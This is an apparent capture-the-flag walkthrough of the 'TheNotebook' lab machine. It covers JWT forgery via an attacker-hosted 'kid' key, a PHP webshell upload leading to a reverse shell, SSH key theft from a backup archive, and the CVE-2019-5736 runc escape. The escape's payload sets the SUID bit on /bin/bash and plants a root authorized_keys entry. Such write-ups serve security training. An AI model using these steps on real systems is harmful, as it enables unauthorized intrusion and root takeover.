# TheNotebook

## Gaining Access

Nmap scan:

```
$ nmap -p- --min-rate 5000 10.129.71.99  
Starting Nmap 7.93 ( https://nmap.org ) at 2023-05-08 09:27 EDT
Nmap scan report for 10.129.71.99
Host is up (0.0081s latency).
Not shown: 65532 closed tcp ports (conn-refused)
PORT      STATE    SERVICE
22/tcp    open     ssh
80/tcp    open     http
```

### Notebook --> JWT Spoof

The website is a notebook website:

<figure><img src="../../../.gitbook/assets/image (2636).png" alt=""><figcaption></figcaption></figure>

We can create a new user because we don't have any credentials. Once created, we can login and view our notes, of which we have none:

<figure><img src="../../../.gitbook/assets/image (2886).png" alt=""><figcaption></figcaption></figure>

When the requests are viewed in Burp, we can see that it uses a JWT token and a `uuid` parameter:

{% code overflow="wrap" %}
```http
GET / HTTP/1.1
Host: 10.129.71.99
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:102.0) Gecko/20100101 Firefox/102.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
Referer: http://10.129.71.99/70e7d57d-8987-4075-9a28-2c9075219c68/notes
Connection: close
Cookie: auth=eyJ0eXAiOiJKV1QiLCJhbGciOiJSUzI1NiIsImtpZCI6Imh0dHA6Ly9sb2NhbGhvc3Q6NzA3MC9wcml2S2V5LmtleSJ9.eyJ1c2VybmFtZSI6InRlc3QxMjMiLCJlbWFpbCI6InRlc3RAd2Vic2l0ZS5jb20iLCJhZG1pbl9jYXAiOjB9.HOnHZHkqdPXbWn4LJrSgF4-DX0UXztaiQxefbsp0DteIvaQUtOMkAGgTvvZex0QU63vcrnXwQRTj5MLfMp1JyFHUWIS5J9slqqhXGsNNSOBQHmHlvptTLa8mvJCZJJAqymKCxGswa41Nu7hb20W3Ksi7iQSg9JcZoy9WeFV9lbEhBiSrler_H1LiSzkF-x4vegERnJiGkZ4hK_2LjVObeeY3ZCQcJWjCH3Cuo2YG1rVas4h0YBinnSq9ANvUsovpLolovsOUP4TNDPzIlccMjmhU0R_yhh5WItg0uG_PiQaACryT3G2_PYw5PRj_Dj5COrHtzYaT2NES2q54WecSJOWfD7RUW6o-yB4SFC_lJVqfqE3DljujJwGcOf8SP43kAf1z_VLGKuUkHceOsvU60aEDZDcgnJB4LTuIjqunIVzZ22lnlfHDGe1zJza8bpUVk-2xDDmqj1F3bBsCMQOXnmMmffBpSFPjsTyBwZM2F3kNEmopZiHr1S1UzeMolW98gzIrwGM8jx1lMOV76SNlK6vGP-q_UoFOg8F07aB6ClPqtbw83cyQZLn2kME40XDBzZgNgbzXmZXfnBg83mkWis9KQhOL8FJ3MPha7h0tfSnsiUXV2s7vATWXlrydpQL6gsWsuWt-cn6CQGEPAX0svar_9K8Pyd08NDJJpNdVfmg; uuid=70e7d57d-8987-4075-9a28-2c9075219c68
Upgrade-Insecure-Requests: 1
```
{% endcode %}

We can take a look at this cookie within jwt.io and see that it uses a private key hosted on the server.&#x20;

<figure><img src="../../../.gitbook/assets/image (2234).png" alt=""><figcaption></figcaption></figure>

The token is spoofable, similar to another machine Unicode. We can generate our own private key using `openssl` and use it to spoof the token by replacing the `kid` parameter with a link hosting the key instead. Also, we can change `admin_cap` to be 1.&#x20;

```bash
openssl genrsa -out priv.key 2048
```

<figure><img src="../../../.gitbook/assets/image (2323).png" alt=""><figcaption></figcaption></figure>

When we use this token after refreshing the page, we can see an Admin Panel present.&#x20;

<figure><img src="../../../.gitbook/assets/image (1161).png" alt=""><figcaption></figcaption></figure>

Then, we can view the notes of the administrator through Admin Panel > View Notes.

<figure><img src="../../../.gitbook/assets/image (3930).png" alt=""><figcaption></figcaption></figure>

Conveniently, the first note reveals that PHP files are left executable on this website.

<figure><img src="../../../.gitbook/assets/image (3326).png" alt=""><figcaption></figcaption></figure>

The admin panel also has an upload file feature:

<figure><img src="../../../.gitbook/assets/image (2856).png" alt=""><figcaption></figcaption></figure>

I uploaded a basic PHP webshell, and the page shows this:

<figure><img src="../../../.gitbook/assets/image (1130).png" alt=""><figcaption></figcaption></figure>

Using this, we can get RCE:

<figure><img src="../../../.gitbook/assets/image (3131).png" alt=""><figcaption></figcaption></figure>

And subsequently, a reverse shell.

<figure><img src="../../../.gitbook/assets/image (918).png" alt=""><figcaption></figcaption></figure>

## Privilege Escalation

We can't grab the user flag yet as `noah` owns it.

### Home.tar.gz

I viewed the `nginx` configuration files:

```
www-data@thenotebook:/$ cat /etc/nginx/sites-available/default
server {
        listen 80 default_server;
        root /var/www/html;
        server_name _;
        location ~ \.php$ {
                include snippets/fastcgi-php.conf;
                fastcgi_pass unix:/var/run/php/php7.2-fpm.sock;
        }
        location / {
                proxy_pass http://127.0.0.1:8080/;
        }
}
```

There was nothing much there that was new. Within the `/var/backups` file, there was an extra file present:

```
www-data@thenotebook:/var/backups$ ls
apt.extended_states.0     apt.extended_states.2.gz  home.tar.gz
apt.extended_states.1.gz  apt.extended_states.3.gz
```

We can copy this folder to `/dev/shm` and open it there since we can't create new files within `/var/backups`.

```
www-data@thenotebook:/var/backups$ cp home.tar.gz /dev/shm
www-data@thenotebook:/var/backups$ cd /dev/shm
www-data@thenotebook:/dev/shm$ ls
home.tar.gz
www-data@thenotebook:/dev/shm$ tar -xvf home.tar.gz 
home/
home/noah/
home/noah/.bash_logout
home/noah/.cache/
home/noah/.cache/motd.legal-displayed
home/noah/.gnupg/
home/noah/.gnupg/private-keys-v1.d/
home/noah/.bashrc
home/noah/.profile
home/noah/.ssh/
home/noah/.ssh/id_rsa
home/noah/.ssh/authorized_keys
home/noah/.ssh/id_rsa.pub
```

We can grab the `id_rsa` file and `ssh` in as `noah`.&#x20;

### Sudo Privileges

We can check our `sudo` privileges:

```
noah@thenotebook:~$ sudo -l
Matching Defaults entries for noah on thenotebook:
    env_reset, mail_badpass,
    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User noah may run the following commands on thenotebook:
    (ALL) NOPASSWD: /usr/bin/docker exec -it webapp-dev01*
noah@thenotebook:~$ docker --version
Docker version 18.06.0-ce, build 0ffa825
```

It seems that we can run docker as `root`. Googling for exploits pertaining to this version reveals a CVE that allows for RCE. This is caused by an outdated `runc` binary that is run from the container.&#x20;

{% embed url="https://github.com/Frichetten/CVE-2019-5736-PoC" %}

Download this repositroy, and we can change the payload run to something else:

{% code overflow="wrap" %}
```bash
var payload = "#!/bin/bash \n chmod u+s /bin/bash && echo 'KEY' >> /root/.ssh/authorized_keys"
```
{% endcode %}

Then we can run `go build main.go` to build it. Then, following the PoC, we can create a Docker container using the `sudo` command allowed.

```bash
sudo /usr/bin/docker exec -it webapp-dev01 /bin/bash
```

Afterwards, within the container, run the `main` binary and it will hang:

```
root@0f4c2517af40:/opt/webapp# ./main 
[+] Overwritten /bin/sh successfully
```

On a second Window, we need to run the `sudo` command one more time, and on the Docker container, it would execute properly:

{% code overflow="wrap" %}
```
root@0f4c2517af40:/opt/webapp# ./main 
[+] Overwritten /bin/sh successfully
[+] Found the PID: 3292
[+] Successfully got the file handle
[+] Successfully got write handle &{0xc00036e060}
[+] The command executed is#!/bin/bash 
 chmod u+s /bin/bash && echo 'KEY' >> /root/.ssh/authorized_keys
```
{% endcode %}

Then, we can just `ssh` into `root`.&#x20;

<figure><img src="../../../.gitbook/assets/image (1358).png" alt=""><figcaption></figcaption></figure>

Rooted!
